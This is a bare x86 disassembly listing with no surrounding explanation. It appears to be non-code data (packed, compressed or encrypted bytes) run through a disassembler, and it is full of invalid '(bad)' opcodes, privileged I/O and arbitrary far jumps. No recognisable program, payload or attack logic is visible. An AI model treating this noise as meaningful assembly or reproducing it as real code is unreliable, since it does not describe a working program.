  413f9c:	outs   dx,DWORD PTR ds:[esi]
  413f9d:	mov    al,0x73
  413f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fa0:	or     al,0x8b
  413fa2:	inc    edi
  413fa3:	daa    
  413fa4:	lea    eax,[eax]
  413fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa9:	sub    BYTE PTR [edx+esi*4-0x38],0x1c
  413fae:	repnz shl BYTE PTR [ecx-0x362e9312],0x52
  413fb6:	pop    ecx
  413fb7:	cmp    al,0x42
  413fb9:	nop
  413fba:	cli    
  413fbb:	mov    bl,0x24
  413fbd:	push   ebp
  413fbe:	lods   eax,DWORD PTR ds:[esi]
  413fbf:	jmp    0x41401c
  413fc1:	loopne 0x41400b
  413fc3:	sbb    al,0xf7
  413fc5:	adc    BYTE PTR [edi],al
  413fc7:	push   es
  413fc8:	jmp    0xbed7:0x4dae66ac
  413fcf:	xchg   ecx,eax
  413fd0:	repz out dx,al
  413fd2:	cmp    al,BYTE PTR [ebp+ebx*8-0x1b4da9d7]
  413fd9:	out    0xe0,al
  413fdb:	cmp    dh,BYTE PTR [esi]
  413fdd:	jb     0x413fa9
  413fdf:	adc    eax,0xf9bb2b37
  413fe4:	sbb    DWORD PTR [ebp+0x49],esp
  413fe7:	mov    al,ds:0x36e6f4ea
  413fec:	cld    
  413fed:	sbb    BYTE PTR ds:0x13dae8bb,ah
  413ff3:	nop
  413ff4:	jae    0x413f9a
  413ff6:	rcl    DWORD PTR [ebp-0x1d],cl
  413ff9:	pop    ecx
  413ffa:	(bad)  [ebx-0x7607d841]
  414000:	mov    bl,0x2c
  414002:	jmp    0xb4012170
  414007:	(bad)  
  414008:	mov    WORD PTR [ebp+0x27402d47],?
  41400e:	or     esi,eax
  414010:	push   ebp
  414011:	lea    edi,[esi]
  414013:	loop   0x413fbb
  414015:	repz mov al,ds:0x8bd476fe
  41401b:	pop    eax
  41401c:	mov    bh,0x41
  41401e:	test   edx,ebx
  414020:	ins    BYTE PTR es:[edi],dx
  414021:	push   ss
  414022:	ror    BYTE PTR [esi],cl
  414024:	cmp    DWORD PTR [ebp-0x4b],esp
  414027:	adc    al,0xf0
  414029:	xor    bh,BYTE PTR [ebp-0x6b]
  41402c:	je     0x413ff0
  41402e:	sbb    ch,BYTE PTR [ecx-0x32315e25]
  414034:	repnz rcr BYTE PTR [edx-0x2878d736],0xdd
  41403c:	mov    esp,0x4bd48e88
  414041:	add    BYTE PTR [esi-0x28],dh
  414044:	mov    ebx,0x255cee95
  414049:	push   cs
  41404a:	mov    cl,0xcc
  41404c:	pop    ss
  41404d:	or     dh,dl
  41404f:	push   edx
  414050:	push   0x4d083208
  414055:	ins    BYTE PTR es:[edi],dx
  414056:	fwait
  414057:	loopne 0x4140d1
  414059:	es adc eax,0x2891b5d8
  41405f:	cwde   
  414060:	push   0x568babcc
  414065:	jo     0x4140a5
  414067:	mov    eax,0x308bb88b
  41406c:	loopne 0x414093
  41406e:	inc    ebp
  41406f:	call   0x6d94e98e
  414074:	(bad)  
  414075:	push   edi
  414076:	xchg   BYTE PTR [ebx],dh
  414078:	hlt    
  414079:	fs jle 0x4140e2
  41407c:	scas   eax,DWORD PTR es:[edi]
  41407d:	and    eax,0x19d7426f
  414082:	into   
  414083:	xor    BYTE PTR [eax-0x163da5ed],ah
  414089:	dec    esi
  41408a:	mov    ds:0xa6ef9988,eax
  41408f:	add    ah,BYTE PTR [ebx+edx*8]
  414092:	imul   ebp,DWORD PTR [edx+0x7c],0xffffffc3
  414096:	ins    DWORD PTR es:[edi],dx
  414097:	(bad)  
  414098:	ror    DWORD PTR [ebx],cl
  41409a:	stc    
  41409b:	movd   DWORD PTR [esi-0x76405002],mm4
  4140a2:	fistp  QWORD PTR [edx-0x60939307]
  4140a8:	mov    cl,0x40
  4140aa:	cli    
  4140ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ac:	(bad)  
  4140ad:	loop   0x41408c
  4140af:	inc    eax
  4140b0:	fnstcw WORD PTR [ebp+0x0]
  4140b3:	aas    
  4140b4:	aam    0x9c
  4140b6:	(bad)  
  4140b7:	cmp    dh,BYTE PTR [esi]
  4140b9:	pop    ds
  4140ba:	repnz enter 0x3f51,0x9a
  4140bf:	fs inc edx
  4140c1:	mov    ch,0x72
  4140c3:	mov    ebp,0x7a14ea6a
  4140c8:	hlt    
  4140c9:	inc    edx
  4140ca:	mov    ch,0x28
  4140cc:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140ce:	add    BYTE PTR [ecx-0x4e],ah
  4140d1:	test   al,0x73
  4140d3:	outs   dx,DWORD PTR ds:[esi]
  4140d4:	xor    DWORD PTR [ebx-0x12],0xffffff95
  4140d8:	inc    esp
  4140d9:	loope  0x4140e7
  4140db:	xchg   BYTE PTR ds:[eax-0x791d6ad8],bh
  4140e2:	xchg   edx,eax
  4140e3:	les    esp,FWORD PTR [edi+0xc]
  4140e6:	dec    ecx
  4140e7:	push   edx
  4140e8:	jno    0x4140d2
  4140ea:	add    cl,BYTE PTR [esi+0x7c52ae7e]
  4140f0:	inc    esi
  4140f1:	punpckhwd mm3,QWORD PTR [ecx]
  4140f4:	mov    DWORD PTR cs:[esi+edx*4+0x1ee8e094],ebp
  4140fc:	push   ds
  4140fd:	ins    DWORD PTR es:[edi],dx
  4140fe:	or     edx,DWORD PTR [ebp-0x66]
  414101:	mov    dh,0xe0
  414103:	je     0x414093
  414105:	pushf  
  414106:	dec    edi
  414107:	jns    0x4140a6
  414109:	or     edi,DWORD PTR [esi]
  41410b:	int3   
  41410c:	sub    BYTE PTR [edx+0x7b60afb1],ah
  414112:	xor    BYTE PTR [edi],0xe8
  414115:	dec    ebp
  414116:	dec    edi
  414117:	add    DWORD PTR [ecx-0x5d],0x64
  41411b:	enter  0x868e,0xc
  41411f:	sub    BYTE PTR [ecx],bh
  414121:	dec    edx
  414122:	mul    DWORD PTR [edi]
  414124:	adc    dl,bl
  414126:	adc    ah,ch
  414128:	mov    edi,0x741252b0
  41412d:	(bad)  
  41412e:	sbb    eax,0x5e289f1c
  414133:	push   ebx
  414134:	pop    ss
  414135:	sbb    BYTE PTR [esi],ah
  414137:	fistp  QWORD PTR cs:[esi]
  41413a:	jecxz  0x414157
  41413c:	adc    eax,0x5ce74463
  414141:	hlt    
  414142:	or     dh,ah
  414144:	xchg   ecx,eax
  414145:	add    BYTE PTR [ecx+ebp*4+0x3f],bl
  414149:	xor    esp,DWORD PTR [edi]
  41414b:	xchg   BYTE PTR [ebx],cl
  41414d:	in     al,dx
  41414e:	fstp   TBYTE PTR [ebx]
  414150:	pop    ebp
  414151:	mov    ebp,0xa23e3386
  414156:	lds    edi,FWORD PTR [edx-0x41c4092d]
  41415c:	sahf   
  41415d:	popa   
  41415e:	push   esp
  41415f:	jp     0x4141b5
  414161:	aas    
  414162:	inc    esp
  414163:	(bad)  
  414164:	jo     0x414122
  414166:	jl     0x414178
  414168:	push   0xffffffa7
  41416a:	adc    cl,dl
  41416c:	dec    ebp
  41416d:	pop    ebp
  41416e:	loop   0x41411e
  414170:	pop    ss
  414171:	xor    eax,0x74051f15
  414176:	dec    ecx
  414177:	mov    BYTE PTR [eax],bh
  414179:	or     DWORD PTR [eax-0x5d40e6f],ebx
  41417f:	(bad)  
  414180:	sbb    DWORD PTR [ecx+0x78715ca8],ebx
  414186:	mov    esi,0x5aa4eaf3
  41418b:	(bad)  
  41418c:	mov    WORD PTR [edx],fs
  41418e:	in     eax,dx
  41418f:	into   
  414190:	call   0x9e952a3c
  414195:	adc    BYTE PTR [ecx],bh
  414197:	adc    bl,BYTE PTR ds:0xdf456fa9
  41419d:	inc    eax
  41419e:	sbb    bl,BYTE PTR [ebx-0x647d35e8]
  4141a4:	clc    
  4141a5:	arpl   WORD PTR [ecx-0x7c],cx
  4141a8:	and    dh,BYTE PTR [eax]
  4141aa:	mov    al,0x85
  4141ac:	popf   
  4141ad:	inc    eax
  4141ae:	leave  
  4141af:	sub    al,0x90
  4141b1:	mov    bh,0x67
  4141b3:	lahf   
  4141b4:	mov    esp,0x2e0a4e3b
  4141b9:	pop    esi
  4141ba:	(bad)  
  4141bb:	lods   eax,DWORD PTR ds:[esi]
  4141bc:	pop    ebx
  4141bd:	sub    ebp,DWORD PTR [ecx+0x3c9b10e2]
  4141c3:	test   ecx,esi
  4141c5:	dec    ebp
  4141c6:	aaa    
  4141c7:	sbb    bl,ah
  4141c9:	ins    BYTE PTR es:[edi],dx
  4141ca:	test   BYTE PTR [edx],0x51
  4141cd:	mov    cl,0x80
  4141cf:	add    ecx,DWORD PTR [ecx-0x7b]
  4141d2:	in     eax,0x8c
  4141d4:	pop    esp
  4141d5:	rol    DWORD PTR [ebp-0x3d],cl
  4141d8:	cmp    eax,ebx
  4141da:	cdq    
  4141db:	in     eax,dx
  4141dc:	jo     0x41419b
  4141de:	mov    esi,0x864ecce4
  4141e3:	in     al,dx
  4141e4:	mov    cl,0x61
  4141e6:	pop    ds
  4141e7:	neg    DWORD PTR [edi+0x6bda9c9e]
  4141ed:	fisttp DWORD PTR [edi+0x33]
  4141f0:	mov    es,WORD PTR [ecx]
  4141f2:	out    0xc9,al
  4141f4:	aaa    
  4141f5:	lods   eax,DWORD PTR ds:[esi]
  4141f6:	cmp    BYTE PTR [eax],0xb
  4141f9:	add    BYTE PTR [ecx],ah
  4141fb:	dec    edi
  4141fc:	fadd   DWORD PTR [esi]
  4141fe:	push   ebp
  4141ff:	out    0xb9,eax
  414201:	cmp    al,0xf6
  414203:	aaa    
  414204:	push   ecx
  414205:	scas   al,BYTE PTR es:[edi]
  414206:	(bad)  
  414207:	mov    bh,bh
  414209:	fs aad 0x36
  41420c:	sbb    ecx,ebp
  41420e:	dec    edx
  41420f:	mov    dh,0x47
  414211:	imul   ebx,DWORD PTR [edx-0x1bf491b0],0x9627f9c7
  41421b:	or     BYTE PTR [edx-0x17],0x1e
  41421f:	jb     0x414205
  414221:	retf   0xed8e
  414224:	dec    esi
  414225:	inc    edi
  414226:	add    bl,BYTE PTR [esi-0x31d1bb00]
  41422c:	sub    al,0x55
  41422e:	cmp    BYTE PTR [edi],bl
  414230:	xlat   BYTE PTR ds:[ebx]
  414231:	mov    ecx,0x54a8ac2b
  414236:	sahf   
  414237:	cmp    ecx,edx
  414239:	fbld   TBYTE PTR [ebx+0x27dce053]
  41423f:	pop    ecx
  414240:	xchg   edi,eax
  414241:	stos   DWORD PTR es:[edi],eax
  414242:	or     bh,BYTE PTR [ebx]
  414244:	fnstcw WORD PTR [edx-0x712fc7ed]
  41424a:	mov    ch,0x1b
  41424c:	fdiv   QWORD PTR [esi-0xfccebb8]
  414252:	fmulp  st(1),st
  414254:	mov    BYTE PTR [esi+eax*2-0xa],al
  414258:	mov    esi,0x5f20db63
  41425d:	mov    esi,0xef5a7e2f
  414262:	inc    edx
  414263:	adc    BYTE PTR [ecx+0x594da593],dh
  414269:	mov    al,0xc0
  41426b:	mov    ds:0x59e17a32,eax
  414270:	and    edx,DWORD PTR [edx]
  414272:	push   ss
  414273:	push   ebx
  414274:	mov    DWORD PTR [eax],ebx
  414276:	jmp    0xf7b9df35
  41427b:	inc    ecx
  41427c:	push   es
  41427d:	mov    fs,WORD PTR [edi]
  41427f:	sub    BYTE PTR [ecx+0x195c68a7],dl
  414285:	lds    edx,FWORD PTR [ebx-0x7737af77]
  41428b:	jecxz  0x41421c
  41428d:	outs   dx,BYTE PTR ds:[esi]
  41428e:	push   cs
  41428f:	aad    0x8b
  414291:	adc    DWORD PTR [edx-0x79b8a192],edx
  414297:	jb     0x414301
  414299:	xchg   ebx,eax
  41429a:	or     ch,BYTE PTR [ebp-0x25]
  41429d:	and    ebp,ebp
  41429f:	jecxz  0x414227
  4142a1:	sbb    eax,0x1578e6af
  4142a6:	sar    bh,1
  4142a8:	inc    esi
  4142a9:	mov    ds:0xb0421440,al
  4142ae:	rol    DWORD PTR [esi+0x7639b4dc],1
  4142b4:	pop    ebx
  4142b5:	push   edi
  4142b6:	test   ecx,esp
  4142b8:	and    eax,0x3490c31d
  4142bd:	fild   WORD PTR [edx]
  4142bf:	idiv   esi
  4142c1:	add    DWORD PTR [ebx+0x6a547368],edx
  4142c7:	dec    ebx
  4142c8:	cwde   
  4142c9:	pop    ebp
  4142ca:	or     DWORD PTR [edx],edx
  4142cc:	inc    esp
  4142cd:	jo     0x4142d2
  4142cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142d0:	cmp    ch,BYTE PTR [edi]
  4142d2:	mov    ecx,0xaefb2560
  4142d7:	pop    ebx
  4142d8:	mov    ch,BYTE PTR [ebp-0x13c75cd3]
  4142de:	and    cl,dh
  4142e0:	xor    dl,BYTE PTR [ebx]
  4142e2:	enter  0x2b90,0x99
  4142e6:	inc    ebx
  4142e7:	xor    DWORD PTR [edx+edx*2],esp
  4142ea:	jae    0x414310
  4142ec:	sub    BYTE PTR [ecx+ebp*8-0x1e],0x2
  4142f1:	add    ch,ch
  4142f3:	adc    BYTE PTR ds:0xa3d0f4e0,ch
  4142f9:	add    eax,edx
  4142fb:	jge    0x4142ff
  4142fd:	xor    al,0x7f
  4142ff:	sub    al,0xcf
  414301:	jo     0x4142bd
  414303:	rcl    BYTE PTR [ecx-0x5],cl
  414306:	aad    0x1f
  414308:	jp     0x41433d
  41430a:	int3   
  41430b:	cmp    DWORD PTR [eax+0x64],0x3f
  41430f:	test   DWORD PTR [edx+0x4c628e74],esi
  414315:	xor    BYTE PTR [ebx+0x34],dl
  414318:	data16 in al,0x3d
  41431b:	inc    edi
  41431c:	mov    esp,0x796c23a0
  414321:	out    dx,eax
  414322:	jg     0x4142d0
  414324:	or     DWORD PTR [ecx-0x5a05d2c5],eax
  41432a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41432b:	stos   DWORD PTR es:[edi],eax
  41432c:	mov    ecx,DWORD PTR ds:0x476449b1
  414332:	daa    
  414333:	push   ds
  414334:	mul    ebp
  414336:	cmp    edi,DWORD PTR ss:[eax-0x6c]
  41433a:	shr    DWORD PTR [edi-0x5f],1
  41433d:	mov    esi,0x307d48cd
  414342:	shr    esp,0x9d
  414345:	pop    ds
  414346:	gs mov ebx,eax
  414349:	ror    DWORD PTR [esi-0x7],cl
  41434c:	inc    ebx
  41434d:	inc    ebp
  41434e:	test   eax,0x15476893
  414353:	out    dx,al
  414354:	out    dx,eax
  414355:	dec    edx
  414356:	ins    DWORD PTR es:[edi],dx
  414357:	daa    
  414358:	jno    0x41430e
  41435a:	arpl   WORD PTR [edx+0x51],dx
  41435d:	ss dec ebx
  41435f:	push   esi
  414360:	test   al,0x6
  414362:	ins    BYTE PTR es:[edi],dx
  414363:	inc    edi
  414364:	lahf   
  414365:	scas   eax,DWORD PTR es:[edi]
  414366:	pop    ebx
  414367:	sbb    edx,DWORD PTR [eax]
  414369:	inc    esp
  41436a:	adc    al,0x6b
  41436c:	pop    eax
  41436d:	stc    
  41436e:	aas    
  41436f:	enter  0xb9,0xef
  414373:	jl     0x414329
  414375:	out    dx,eax
  414376:	mov    esp,0xea1f27b5
  41437b:	jl     0x4143c3
  41437d:	bound  ebx,QWORD PTR [ebx-0x62]
  414380:	dec    ebp
  414381:	ins    DWORD PTR es:[edi],dx
  414382:	loope  0x414326
  414384:	sub    cl,BYTE PTR [ebp+0x2d8511cb]
  41438a:	popf   
  41438b:	jae    0x4143bd
  41438d:	shl    DWORD PTR [esp+ebx*2],cl
  414390:	and    DWORD PTR [edi-0x28],edi
  414393:	js     0x414406
  414395:	xchg   ebp,eax
  414396:	rol    BYTE PTR [ebp-0x63],1
  414399:	imul   ebp,ebx,0xffffffe6
  41439c:	ret    
  41439d:	popa   
  41439e:	jnp    0x414389
  4143a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143a1:	popa   
  4143a2:	clc    
  4143a3:	and    ch,bh
  4143a5:	mov    ah,0x39
  4143a7:	adc    BYTE PTR [edi+0x66804364],dl
  4143ad:	mov    ebp,0x21ff7729
  4143b2:	das    
  4143b3:	fist   WORD PTR [ecx-0x3394d75]
  4143b9:	add    DWORD PTR [edi],ebx
  4143bb:	call   0xddcb:0x92cc995
  4143c2:	(bad)  
  4143c3:	in     al,0x26
  4143c5:	inc    esp
  4143c6:	sti    
  4143c7:	scas   eax,DWORD PTR es:[edi]
  4143c8:	or     al,0xc
  4143ca:	dec    ebx
  4143cb:	pop    edi
  4143cc:	sub    esp,edi
  4143ce:	mov    BYTE PTR [edi],bh
  4143d0:	(bad)  
  4143d1:	sti    
  4143d2:	mov    edi,0xe09ba393
  4143d7:	retf   0x464c
  4143da:	(bad)  
  4143db:	int    0x1a
  4143dd:	(bad)  
  4143de:	aas    
  4143df:	push   ss
  4143e0:	int    0x9a
  4143e2:	xchg   esi,eax
  4143e3:	fistp  WORD PTR [ebx+esi*4]
  4143e6:	mov    ch,BYTE PTR [edi+0x27]
  4143e9:	push   ds
  4143ea:	jg     0x41444d
  4143ec:	retf   
  4143ed:	ror    DWORD PTR ds:0x8100c70f,1
  4143f3:	mov    dl,0x2d
  4143f5:	sbb    BYTE PTR cs:[edx],0x33
  4143f9:	(bad)  
  4143fa:	mov    ds:0x4a251e4,al
  4143ff:	std    
  414400:	neg    ch
  414402:	out    0xc4,al
  414404:	adc    eax,0xd847bd2f
  414409:	xlat   BYTE PTR ds:[ebx]
  41440a:	mov    ebx,fs
  41440c:	cmp    al,0x4b
  41440e:	aad    0x46
  414410:	adc    al,0x76
  414412:	int3   
  414413:	adc    cl,cl
  414415:	push   ecx
  414416:	fadd   QWORD PTR [edx]
  414418:	add    eax,0xeb0dca5c
  41441d:	aas    
  41441e:	cli    
  41441f:	pusha  
  414420:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  414422:	jecxz  0x414466
  414424:	mov    gs,WORD PTR [edx+0x55]
  414427:	sbb    eax,0x6ace8f86
  41442c:	push   ebx
  41442d:	add    dh,BYTE PTR [esi+eiz*1+0x7bf77657]
  414434:	outs   dx,BYTE PTR ds:[esi]
  414435:	xor    eax,0xf371b7c6
  41443a:	and    bl,bl
  41443c:	dec    ecx
  41443d:	mov    ah,0xa9
  41443f:	enter  0xccf2,0xf5
  414443:	xor    esi,DWORD PTR [edi-0x17fbc119]
  414449:	inc    eax
  41444a:	push   cs
  41444b:	mov    BYTE PTR [esi],al
  41444d:	mov    cl,0x2e
  41444f:	ret    
  414450:	sub    DWORD PTR [ecx-0x2e],esp
  414453:	jo     0x414464
  414455:	cs retf 
  414457:	popa   
  414458:	arpl   WORD PTR [edi],si
  41445a:	in     al,0x64
  41445c:	or     al,0x32
  41445e:	or     eax,0x246e5c63
  414463:	ror    DWORD PTR [edi-0x6e836b6f],cl
  414469:	and    ch,dh
  41446b:	pop    eax
  41446c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41446d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41446e:	pop    ebp
  41446f:	out    dx,al
  414470:	xor    ebx,0x75
  414473:	cdq    
  414474:	fnsave [ebp+0x2fa6dbdd]
  41447a:	or     eax,0xde68c827
  41447f:	push   ds
  414480:	ja     0x414449
  414482:	pop    esp
  414483:	fdiv   QWORD PTR [eax]
  414485:	ror    al,1
  414487:	call   0xa77d:0xa2eb20e1
  41448e:	jmp    0x3026a555
  414493:	aam    0x1f
  414495:	and    BYTE PTR [ebp+0xfcf1f3c],0xd3
  41449c:	in     eax,dx
  41449d:	(bad)  
  4144a0:	daa    
  4144a1:	xchg   ebx,eax
  4144a2:	lds    edx,FWORD PTR [ecx]
  4144a4:	xchg   ebp,eax
  4144a5:	sub    ecx,DWORD PTR [edi]
  4144a7:	and    BYTE PTR [ebx+edi*1-0x80],ch
  4144ab:	imul   ebx,DWORD PTR [eax],0xb006e29a
  4144b1:	jmp    0x4144ab
  4144b3:	dec    eax
  4144b4:	aad    0xbd
  4144b6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144b8:	cmp    ecx,ebp
  4144ba:	aas    
  4144bb:	xor    eax,0x72eb0687
  4144c0:	jle    0x41452b
  4144c2:	mov    dl,0x9a
  4144c4:	test   al,0x7a
  4144c6:	rcr    al,1
  4144c8:	adc    al,0xd9
  4144ca:	cmp    eax,DWORD PTR [ecx]
  4144cc:	dec    edx
  4144cd:	hlt    
  4144ce:	dec    ebx
  4144cf:	call   0x46ce:0x35ed7d9d
  4144d6:	js     0x414482
  4144d8:	mov    bl,0xc0
  4144da:	inc    edx
  4144db:	ror    BYTE PTR [ecx+0x44dba636],1
  4144e1:	stos   BYTE PTR es:[edi],al
  4144e2:	test   ah,al
  4144e4:	or     cl,dh
  4144e6:	sbb    DWORD PTR [ebx+0x25fac70],0x2ba50d5
  4144f0:	add    al,0x4b
  4144f2:	ret    0x3d66
  4144f5:	add    cl,al
  4144f7:	fist   WORD PTR [ecx-0x78]
  4144fa:	and    eax,0x17fefa24
  4144ff:	push   cs
  414500:	jge    0x414559
  414502:	xchg   esp,eax
  414503:	xchg   ebp,eax
  414504:	gs push ss
  414506:	jp     0x414576
  414508:	xchg   esi,eax
  414509:	imul   esi,edi,0x67
  41450c:	pop    eax
  41450d:	mov    al,ds:0xf87cd873
  414512:	ror    dh,0xf7
  414515:	add    al,0x74
  414517:	loope  0x414524
  414519:	pop    edx
  41451a:	mov    bh,0xe7
  41451c:	or     al,0x1e
  41451e:	cmp    BYTE PTR [eax],0xb8
  414521:	lods   eax,DWORD PTR ds:[esi]
  414522:	sbb    BYTE PTR [ecx],bh
  414524:	mov    esi,0xc378be6d
  414529:	cwde   
  41452a:	or     al,0x73
  41452c:	ja     0x41450e
  41452e:	int3   
  41452f:	mov    eax,DWORD PTR [ecx-0x28]
  414532:	imul   esp,DWORD PTR [eax-0x79],0xfe38349a
  414539:	ss cmp edx,eax
  41453c:	xchg   esi,eax
  41453d:	inc    ecx
  41453e:	cwde   
  41453f:	jne    0x4144db
  414541:	imul   ecx,DWORD PTR [eax],0xed797bf9
  414547:	xor    al,0x65
  414549:	cmp    dh,BYTE PTR [edi+ebp*1+0x4c4fd8e]
  414550:	mov    BYTE PTR [ecx-0x33],bh
  414553:	ja     0x41458c
  414555:	pop    ss
  414556:	xchg   BYTE PTR [edi-0x5a],ah
  414559:	mov    dh,BYTE PTR [ebp+0x2036446c]
  41455f:	or     dl,bl
  414561:	inc    eax
  414562:	sub    esp,DWORD PTR [edi+0x5d]
  414565:	adc    ebx,DWORD PTR [eax-0x701bf7cb]
  41456b:	icebp  
  41456c:	add    eax,0xf3b223fc
  414571:	repnz push ebx
  414573:	int    0x7
  414575:	dec    esi
  414576:	inc    ebx
  414577:	mov    dh,0x6
  414579:	fwait
  41457a:	ins    DWORD PTR es:[edi],dx
  41457b:	add    esi,DWORD PTR [eax-0x5d291fd7]
  414581:	addr16 mov ch,0x43
  414584:	or     BYTE PTR [edi],bh
  414586:	sbb    al,BYTE PTR [edi+0x7fc052c3]
  41458c:	ss js  0x41459d
  41458f:	not    dh
  414591:	jp     0x414585
  414593:	data16 sub bh,cl
  414596:	lods   eax,DWORD PTR ds:[esi]
  414597:	(bad)  
  414598:	fcom   QWORD PTR [eax]
  41459a:	inc    edi
  41459b:	mov    eax,0x4dee39af
  4145a0:	jecxz  0x41455a
  4145a2:	inc    ebx
  4145a3:	sbb    eax,DWORD PTR [ecx+0x5c]
  4145a6:	xor    edx,eax
  4145a8:	or     ch,0x53
  4145ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145ac:	pop    ebp
  4145ad:	mov    BYTE PTR [edi],cl
  4145af:	hlt    
  4145b0:	sbb    edi,ebp
  4145b2:	data16 mov ch,BYTE PTR [esi]
  4145b5:	loope  0x414608
  4145b7:	push   eax
  4145b8:	and    ecx,ebp
  4145ba:	rol    BYTE PTR [eax-0x5ee75ba],1
  4145c0:	ins    BYTE PTR es:[edi],dx
  4145c1:	loope  0x41454d
  4145c3:	mov    ds:0xf554c2b1,eax
  4145c8:	xor    al,0x64
  4145ca:	enter  0xa502,0x7
  4145ce:	or     ebx,DWORD PTR [ebx]
  4145d0:	test   DWORD PTR [edi-0x3e],ecx
  4145d3:	cwde   
  4145d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145d5:	dec    ebx
  4145d6:	pop    ebx
  4145d7:	mov    ch,0xcc
  4145d9:	cdq    
  4145da:	inc    ecx
  4145dc:	xchg   ebx,eax
  4145dd:	push   ecx
  4145de:	push   eax
  4145df:	jmp    0x4145ba
  4145e1:	(bad)  
  4145e3:	in     eax,0x75
  4145e5:	ds in  eax,dx
  4145e7:	int    0xf1
  4145e9:	mov    DWORD PTR [edx+0x6e9e1906],esp
  4145ef:	xlat   BYTE PTR ds:[ebx]
  4145f0:	ret    
  4145f1:	cmp    al,0x21
  4145f3:	arpl   WORD PTR [ecx+esi*4-0x2a],dx
  4145f7:	shl    DWORD PTR [ecx+0x15255d44],cl
  4145fd:	jp     0x414582
  4145ff:	jmp    0x5c4250ec
  414604:	les    ecx,FWORD PTR [edx]
  414606:	jns    0x41458e
  414608:	push   ds
  414609:	enter  0xed39,0x60
  41460d:	je     0x4145de
  41460f:	fs push ecx
  414611:	fwait
  414612:	jge    0x41460c
  414614:	dec    BYTE PTR [edx-0x46b4fc1c]
  41461a:	leave  
  41461b:	sub    ebx,DWORD PTR [edi-0x10]
  41461e:	test   BYTE PTR [eax],ch
  414620:	int    0x4b
  414622:	cmp    dl,cl
  414624:	pop    es
  414625:	xchg   edi,eax
  414626:	stos   DWORD PTR es:[edi],eax
  414627:	or     al,0xf1
  414629:	jecxz  0x4145f6
  41462b:	cwde   
  41462c:	jle    0x414634
  41462e:	push   0x73090952
  414633:	int3   
  414634:	mov    al,ds:0x3012e373
  414639:	sar    bh,1
  41463b:	adc    BYTE PTR [ebx-0x7501c7ba],dl
  414641:	mov    ds:0x220d1f77,al
  414646:	ror    ah,1
  414648:	nop
  414649:	or     al,0x7f
  41464b:	inc    eax
  41464c:	jmp    0x41469a
  41464e:	bound  eax,QWORD PTR [esp+ecx*1]
  414651:	push   0x58
  414653:	mov    dh,0x6
  414655:	f2xm1  
  414657:	fwait
  414658:	mov    esi,0x4dc93438
  41465d:	pushf  
  41465e:	test   eax,0x54a8fd26
  414663:	inc    edx
  414664:	xor    dh,BYTE PTR [ecx-0x28]
  414667:	pop    esp
  414668:	mov    eax,0xf3953c8a
  41466d:	out    dx,eax
  41466e:	imul   ebx,DWORD PTR [edi],0xffffff9c
  414671:	dec    eax
  414672:	inc    ebx
  414673:	mov    bl,0x67
  414675:	and    al,0xbc
  414677:	in     eax,0x53
  414679:	and    edi,edx
  41467b:	(bad)  
  41467c:	jns    0x8dd6a3b0
  414682:	pop    ds
  414683:	pop    eax
  414684:	cmp    eax,0x201ad2ac
  414689:	sub    al,0x43
  41468b:	dec    ebx
  41468c:	rcr    DWORD PTR [esi-0x4529e329],1
  414692:	add    DWORD PTR [ecx+0x17],edi
  414695:	in     al,0xd7
  414697:	stos   BYTE PTR es:[edi],al
  414698:	inc    eax
  414699:	and    dl,dh
  41469b:	xchg   ebx,eax
  41469c:	js     0x4146e8
  41469e:	or     BYTE PTR [ecx],al
  4146a0:	xor    al,0xdc
  4146a2:	sub    ecx,DWORD PTR [ecx-0x34]
  4146a5:	out    dx,al
  4146a6:	xor    al,0xcd
  4146a8:	add    eax,0x442c78d5
  4146ad:	jl     0x4146c1
  4146af:	inc    eax
  4146b0:	pop    ecx
  4146b1:	pop    ss
  4146b2:	xchg   DWORD PTR [ecx-0x78],esp
  4146b5:	in     eax,0x81
  4146b7:	mov    edx,0x4a73bc09
  4146bc:	mov    BYTE PTR [eax],bl
  4146be:	ret    0xebc5
  4146c1:	fsub   QWORD PTR [esi]
  4146c3:	pop    edi
  4146c4:	pop    esp
  4146c5:	dec    ebp
  4146c6:	js     0x414731
  4146c8:	clc    
  4146c9:	fwait
  4146ca:	inc    edx
  4146cb:	aad    0xdd
  4146cd:	test   BYTE PTR es:[ebx-0x6acbcde8],0x9a
  4146d5:	dec    edi
  4146d6:	mov    esi,0x7bcce72e
  4146db:	jne    0x4146f2
  4146dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146de:	inc    ebx
  4146df:	jecxz  0x4146af
  4146e1:	ss mov bl,0xb3
  4146e4:	je     0x41473c
  4146e6:	inc    edx
  4146e7:	pop    ss
  4146e8:	in     al,0x4b
  4146ea:	mov    ebp,0xc618c7a6
  4146ef:	cmp    DWORD PTR [ebx-0x6ce14667],ecx
  4146f5:	add    eax,0xdced0519
  4146fa:	xchg   edx,eax
  4146fb:	xchg   BYTE PTR [ebx+0x577aae18],al
  414701:	repz out 0x7e,eax
  414704:	sbb    bl,bl
  414706:	int    0xe0
  414708:	pusha  
  414709:	fadd   QWORD PTR [ecx]
  41470b:	jo     0x4146c1
  41470d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41470e:	dec    ecx
  41470f:	jbe    0x414701
  414711:	sahf   
  414712:	pusha  
  414713:	add    ch,BYTE PTR [ebx]
  414715:	mov    DWORD PTR [ebx],0xcc32b507
  41471b:	push   ecx
  41471c:	test   al,0x35
  41471e:	(bad)  
  41471f:	fcom   QWORD PTR [edi+0x77]
  414722:	loope  0x4146cb
  414724:	sbb    al,BYTE PTR [edx-0x4c4ca949]
  41472a:	fcomp  DWORD PTR [eax+0x41]
  41472d:	into   
  41472e:	arpl   si,sp
  414730:	mov    cl,0xfb
